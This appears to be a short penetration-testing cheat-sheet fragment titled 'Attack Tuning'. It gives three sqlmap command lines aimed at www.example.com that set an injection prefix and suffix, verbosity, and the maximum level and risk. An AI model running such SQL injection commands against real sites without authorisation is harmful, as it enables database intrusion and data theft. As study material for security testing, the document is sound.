## Attack Tuning

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```shell-session
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

```shell-session
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```
